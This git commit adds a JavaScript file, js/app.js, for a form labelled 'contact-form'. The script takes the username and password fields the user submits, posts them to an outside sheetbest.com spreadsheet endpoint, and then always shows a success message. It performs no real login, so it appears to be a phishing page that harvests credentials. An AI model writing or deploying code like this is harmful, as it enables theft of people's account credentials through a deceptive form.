f3ddab826663047e0accb07755df9f8d3c537846
soporte-hg <cyclemoor4@gmail.com>
2024-11-20 10:45:19 -0600

    add files

---
+++ js/app.js
@@ -0,0 +1,30 @@
+const formulario = document.getElementById('contact-form');
+const registro = document.getElementById('registro');
+const exito = document.getElementById('exito');
+
+formulario.addEventListener('submit', async(e) =>{
+    e.preventDefault();
+
+
+try {    
+    const respuesta = await fetch('https://api.sheetbest.com/sheets/5860114f-fe25-4edd-a265-93b18b08b87a', {
+        method: 'POST',
+        mode: 'cors',
+        headers: {
+            'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+            "Usuario": formulario.usuario.value,
+            "Clave": formulario.contraseña.value
+        })
+    });
+
+
+
+} catch(error){
+    console.log(error);
+}
+    
+    registro.classList.remove('activo');
+    exito.classList.add('activo');
+});
